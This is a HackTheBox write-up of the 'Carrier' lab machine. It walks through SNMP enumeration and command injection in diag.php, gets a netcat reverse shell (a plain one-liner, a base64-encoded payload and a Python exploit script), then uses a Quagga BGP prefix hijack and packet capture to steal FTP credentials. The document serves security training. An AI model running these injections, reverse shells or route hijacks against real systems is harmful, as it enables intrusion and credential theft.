---
title: "HackTheBox: Carrier Write Up!"
date: 2019-04-02
tags: [Hackthebox, ctf, writeup, Carrier]
excerpt: "HackTheBox: Carrier Write Up!"
header:
  image: "assets/images/hackthebox-images/carrier-hackthebox-header.png"

---

## Carrier Hackthebox Writeup!

#### Enumeration

#### Nmap port scanning:

NMAP TCP port scanning:

```
$ nmap -sV -sC -Pn -T5 10.10.10.105 -o carrier.nmap


PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.18 seconds
```
NMAP Udp port scanning:

```
$ nmap --top-ports 100 -sU 10.10.10.105 -o carrier-udp2.nmap


Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-20 04:54 EST
Nmap scan report for 10.10.10.105
Host is up (0.28s latency).
Not shown: 93 closed ports
PORT     STATE         SERVICE
67/udp   open|filtered dhcps
161/udp  open          snmp
500/udp  open|filtered isakmp
997/udp  open|filtered maitrd
1026/udp open|filtered win-rpc
1434/udp open|filtered ms-sql-m
5632/udp open|filtered pcanywherestat
```

### Directories scanning:

```
[03:18:29] Starting:
[03:18:34] 200 -  931B  - /img/
[03:18:36] 200 -    1KB - /index.php
[03:18:36] 403 -  293B  - /icons/
[03:18:37] 200 -  940B  - /tools/
[03:18:41] 200 -    1KB - /doc/
[03:18:51] 200 -    3KB - /css/
[03:19:08] 200 -    2KB - /js/
[03:20:01] 302 -    0B  - /tickets.php  ->  /index.php
[03:20:14] 200 -    2KB - /fonts/
[03:20:22] 302 -    0B  - /dashboard.php  ->  /index.php
[03:22:13] 200 -   83KB - /debug/
[03:28:44] 302 -    0B  - /diag.php  ->  /index.php
```

 > After scanning Directories with dirsearch I found a pdf file which contains the explanation of the error codes which where shown on the main page of the site.

@ http://10.10.10.105/doc/error_codes.pdf
45007 --> License invalid or expired
45009 --> System credentials have been setDefault admin user password is set (see chassis serial number)

> As udp port scan shows that the snmp port 161 is up. I used snmpwalk right away!

$ snmpwalk -c public -v 2c 10.10.10.105

```
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
iso.3.6.1.2.1.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)   
```
> This revealed string that contains the password. First i tried the whole string as "SN#NET_45JDX23" which did not worked, after that I thought why not to try only "NET_45JDX23", Which actually worked with the user admin.

@ http://10.10.10.105/dashboard.php
```
username: admin
password: NET_45JDX23               
```

#### Ticket Page note says:

> Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end.
Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15:
CastCom. still reporting issues with 3 networks: 10.120.15,  10.120.16,  10.120.17/24's, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating...
Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually.   

#### Command Injection:

```
curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Referer: http://10.10.10.105/diag.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=cXVhZ2dh' \
    --data-binary $'check=| nc 10.10.13.255 1337' \
    $'http://10.10.10.105/diag.php'  
```

> Which out the output of ps aux and also it was greping the quagga from it. so the command was like "ps aux | grep quagga". quagga was out base64 input from the post request and now we know that it is command injection.

payload:
`| whoami`

`base64-encode= YHwgd2hvYW1pYA==`

```
curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Referer: http://10.10.10.105/diag.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=civdj8h94df0kj1smcf948q7v6' \
    --data-binary $'check=fCBjYXQgdXNlci50eHQ=' \
    $'http://10.10.10.105/diag.php'     
```    
And the output was `root`. So, Confirmed its was the command injection.

@ http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/

reverse shell payload:
`payload: rm f;mkfifo f;cat f|/bin/sh -i 2>&1|/bin/nc.openbsd 10.10.15.176 21 > f`

Curl request to get reverse shell

```
curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Referer: http://10.10.10.105/diag.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=0lt8vqm3in2h456miodpsk4ok4' \
    --data-binary $'check=fCBybSBmO21rZmlmbyBmO2NhdCBmfC9iaW4vc2ggLWkgMj4mMXwvYmluL25jLm9wZW5ic2QgMTAuMTAuMTUuMjQ5IDE0NDcgPiBm' \
    $'http://10.10.10.105/diag.php'       

```

> After exploring a site bit I realised, Its getting very hard to reproduce every step again and again to get reverse shell, So I code a reverse shell exploit.


### Reverse shell exploit:

```python
import requests
import sys
import base64
import subprocess
import multiprocessing

index = "http://10.10.10.105/"
dashboard = "http://10.10.10.105/dashboard.php"
diag = "http://10.10.10.105/diag.php"
ip = sys.argv[1]
port = sys.argv[2]

cookies1 = {
    'PHPSESSID': '46i5r5qj18h6vl9rdp8so862v5',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0',
    'Referer': 'http://10.10.10.105/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
}

data = 'username=admin&password=NET_45JDX23'

def listner():
	print("[+] Listing on port 1447 ")
	subprocess.call("nc -lnvp {}".format(port) , shell=True)

with requests.Session() as box:

	#performing Login reqeust
	response = box.post(index, headers=headers, cookies=cookies1, data=data)
	#Reqeusting dashboard to get cookies
	dashboard = box.get(dashboard)
	#Second Post Request for Exploit
	payload = "| rm f;mkfifo f;cat f|/bin/sh -i 2>&1|/bin/nc.openbsd {} {} > f".format(ip,port)
	#base64 encode payload
	encoded_payload = base64.b64encode(payload)
	post_payload = "check={}".format(encoded_payload)
	#Final post request for exploit
	print("[+] Exploting it....!")
	process = multiprocessing.Process(target=listner)
	process.start()
	exploit = box.post(diag, headers=headers, cookies=cookies1, data=post_payload)
	print(exploit.status_code)

```

#### Spawing shell:

```
$ /bin/bash -i
```    

### @ BGP Prefix Hijack Attacks - ColoState

> Basically quagga is a routing software and since quagga is installed on this host then most likely we are going to perform bgp-hijacking or route-hijacking.
I won’t go through a detailed explanation about this attack because that will be off-topic ,
I will include some resources. In simple words we are going to hijack another network prefixes and announce them to us ,
so if anybody tried to connect to that network they will connect to us.
This is possible because we are on the host that is responsible for routing.

#### Resources

@ http://tcpflag.blogspot.com/2010/03/using-quaggas-command-line.html
@ https://blog.cdemi.io/beginners-guide-to-understanding-bgp/
@ http://www.ciscopress.com/articles/article.asp?p=426637&seqNum=2

Quagga stores its configuration files in /etc/quagga/ directory

```
root@r1:/etc/quagga# cat bgpd.conf

!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!
```

@ command line utility: vtysh

```
r1# write terminal

Building configuration...

Current configuration:
!
!
interface eth0
 ipv6 nd suppress-ra
 no link-detect
!
interface eth1
 ipv6 nd suppress-ra
 no link-detect
!
interface eth2
 ipv6 nd suppress-ra
 no link-detect
!
interface lo
 no link-detect
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.11.2 route-map to-as300 out
!
route-map to-as200 permit 10
!
route-map to-as300 permit 10
!
ip forwarding
!
line vty
!
end
```
Checking the bgp summary:

```
r1# show ip bgp summary

BGP router identifier 10.255.255.1, local AS number 100
RIB entries 55, using 6160 bytes of memory
Peers 2, using 9136 bytes of memory

Neighbor        V         AS MsgRcvd MsgSent   TblVer  InQ OutQ Up/Down  State/PfxRcd
10.78.10.2      4   200      16      18        0    0    0 00:09:23       22
10.78.11.2      4   300      13      21        0    0    0 00:09:20       22

Total number of neighbors 2
```

```
r1# show ip bgp
show ip bgp
BGP table version is 0, local router ID is 10.255.255.1
Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
              i internal, r RIB-failure, S Stale, R Removed
Origin codes: i - IGP, e - EGP, ? - incomplete

   Network          Next Hop            Metric LocPrf Weight Path
*> 10.78.10.0/24    0.0.0.0                  0         32768 ?
*> 10.78.11.0/24    0.0.0.0                  0         32768 ?
*> 10.99.64.0/24    0.0.0.0                  0         32768 ?
```

Commands that helped me to route the servers:

```
> configure terminal

> access-list 50 permit 10.120.15.0 0.0.0.128   --> This is ftp server
> access-list 60 permit 10.78.10.0 0.0.0.128          --> thsese two guyes are our netwrok
> access-list 60 permit 10.78.10.128 0.0.0.128

> route-map to-as200 permit 10     
> match ip address 50         {Routing the AS200 to our ftp server}
> set community no-export         {Not sure why I used was mentioned In a vlog to use it after match command}
> route-map to-as200 permit 20

> route-map to-as300 deny 10       {We will deny the AS300 } {To ignore by the route map}
> match ip address 50
> route-map to-as300 permit 20
> match ip address 60
> set community no-export
> route-map to-as300 permit 30

> route bgp 100
> network 10.78.10.0/25
> network 10.78.10.128/25
> network 10.120.15.0/25
> exit
> exit
r1#clear ip bgp *
r1# exit
```

### Explanation of commands:

access-list:

> | Step 1 | enable Example: Device> enable |
> | Step 2 | configure terminal Example: Device# configure terminal |
> | Step 3 | access-list access-list-number permit {source [source-wildcard] | any} [log] Example: Device(config)# access-> list 1 permit 172.16.5.22 0.0.0.0 |

To distribute any routes that have a destination IP  network number address that is permitted by a standard access list, an  expanded access list, or a prefix list, use the match ip address command. To remove the match ip address entry, use the no form of this command.
match ip address {prefix-list prefix-list-name [prefix-list-name...]}

@ https://www.nongnu.org/quagga/docs/docs-multi/Route-Map-Match-Command.html

You must define a route map when specifying which of the routes from the specified routing protocol are allowed to be redistributed into the target routing process.
To define a route map, enter the following command:

route-map
Commad:
route-mapname {permit | deny} [sequence_number]
Explanation: Creates the route map entry. Enters route-map configuration mode

Example: Example:hostname(config)#route-map name {permit} [12]
Explanation: Route map entries are read in order. You can identify the order using the sequence_number argument, or the ASA uses the order in which you add route map entries

> Hi, I did this networking bgp stuff first time :( So please expect some mistakes! also it took me whole week to understand and exploit that bgp hijacking thing!

Now, All I have to do is to capture the packets.

$ root@carrier:~# tcpdump -i any -w root1.pcap -s 0 net 10.120.15.0/24

After going through the output of capture packets I found these credentials in it.

```
ftp password:BGPtelc0rout1ng
```

Finally, logged in to the ssh using these keys!

```
$ ssh root@10.10.10.105
$ root@carrier:~# cat /root/root.txt | wc -c
 33
 ```

Done, And we owned root !
